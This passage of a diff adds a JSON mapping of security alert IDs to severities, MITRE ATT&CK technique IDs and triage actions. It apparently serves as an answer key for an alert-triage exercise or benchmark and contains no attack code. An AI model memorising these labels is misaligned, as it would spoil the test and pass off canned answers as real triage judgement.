+    "A-0004": {
+      "severity": "high",
+      "mitre_technique_id": "T1078",
+      "recommended_action": "investigate"
+    },
+    "A-0005": {
+      "severity": "high",
+      "mitre_technique_id": "T1566.001",
+      "recommended_action": "investigate"
+    },
+    "A-0006": {
+      "severity": "critical",
+      "mitre_technique_id": "T1486",
+      "recommended_action": "contain"
+    },
+    "A-0007": {
+      "severity": "critical",
+      "mitre_technique_id": "T1003.001",
+      "recommended_action": "contain"
+    },
+    "A-0008": {
+      "severity": "high",
+      "mitre_technique_id": "T1071.004",
+      "recommended_action": "investigate"
+    },
+    "A-0009": {
+      "severity": "high",
+      "mitre_technique_id": "T1105",
+      "recommended_action": "contain"
+    },
+    "A-0010": {
+      "severity": "high",
+      "mitre_technique_id": "T1053.005",
+      "recommended_action": "investigate"
+    },
+    "A-0011": {
+      "severity": "medium",
+      "mitre_technique_id": "T1046",
+      "recommended_action": "investigate"
+    },
+    "A-0012": {
+      "severity": "informational",
+      "mitre_technique_id": "T1046",
+      "recommended_action": "close_false_positive"
+    },
+    "A-0013": {
+      "severity": "low",
+      "mitre_technique_id": "T1059.001",
+      "recommended_action": "close_false_positive"
+    },
+    "A-0014": {
+      "severity": "high",
+      "mitre_technique_id": "T1078",
+      "recommended_action": "investigate"
+    },
+    "A-0015": {
+      "severity": "high",
+      "mitre_technique_id": "T1048",
+      "recommended_action": "escalate"
+    },
+    "A-0016": {
+      "severity": "high",
+      "mitre_technique_id": "T1562.001",
+      "recommended_action": "investigate"
+    },
+    "A-0017": {
+      "severity": "high",
+      "mitre_technique_id": "T1136",
+      "recommended_action": "investigate"
+    },
+    "A-0018": {
+      "severity": "critical",
+      "mitre_technique_id": "T1098",
+      "recommended_action": "escalate"
+    },
+    "A-0019": {
+      "severity": "high",
+      "mitre_technique_id": "T1496",
+      "recommended_action": "contain"
+    },
+    "A-0020": {
+      "severity": "high",
+      "mitre_technique_id": "T1021.001",
+      "recommended_action": "investigate"
+    },
+    "A-0021": {
+      "severity": "high",
+      "mitre_technique_id": "T1190",
+      "recommended_action": "investigate"
+    },
+    "A-0022": {
+      "severity": "critical",
+      "mitre_technique_id": "T1190",
+      "recommended_action": "contain"
+    },
+    "A-0023": {
+      "severity": "critical",
+      "mitre_technique_id": "T1071",
+      "recommended_action": "escalate"
+    },
+    "A-0024": {
+      "severity": "critical",
+      "mitre_technique_id": "T1003",
+      "recommended_action": "contain"
+    },
+    "A-0025": {
+      "severity": "high",
+      "mitre_technique_id": "T1055",
+      "recommended_action": "contain"
+    },
+    "A-0026": {
+      "severity": "high",
+      "mitre_technique_id": "T1566.002",
+      "recommended_action": "investigate"
+    },
+    "A-0027": {
+      "severity": "medium",
+      "mitre_technique_id": "T1567",
+      "recommended_action": "investigate"
+    },
+    "A-0028": {
+      "severity": "critical",
+      "mitre_technique_id": "T1059.004",
+      "recommended_action": "contain"
+    },
+    "A-0029": {
+      "severity": "medium",
+      "mitre_technique_id": "T1547",
+      "recommended_action": "investigate"
+    },
+    "A-0030": {
+      "severity": "low",
+      "mitre_technique_id": "T1071.004",
+      "recommended_action": "monitor"
+    },
+    "A-0031": {
+      "severity": "low",
+      "mitre_technique_id": "T1110",
+      "recommended_action": "monitor"
+    },
+    "A-0032": {
+      "severity": "informational",
+      "mitre_technique_id": "T1021.001",
+      "recommended_action": "close_false_positive"
+    },
+    "A-0033": {
+      "severity": "high",
+      "mitre_technique_id": "T1027",
+      "recommended_action": "contain"
+    },
+    "A-0034": {
+      "severity": "medium",
+      "mitre_technique_id": "T1133",
+      "recommended_action": "investigate"
+    },
+    "A-0035": {
+      "severity": "high",
+      "mitre_technique_id": "T1021",
+      "recommended_action": "contain"
+    },
+    "A-0036": {
+      "severity": "low",
+      "mitre_technique_id": "T1566",
+      "recommended_action": "monitor"
+    },
+    "A-0037": {
+      "severity": "high",
+      "mitre_technique_id": "T1496",
+      "recommended_action": "contain"
+    },
+    "A-0038": {
+      "severity": "high",
+      "mitre_technique_id": "T1053",
+      "recommended_action": "investigate"
+    }
+  }
+}
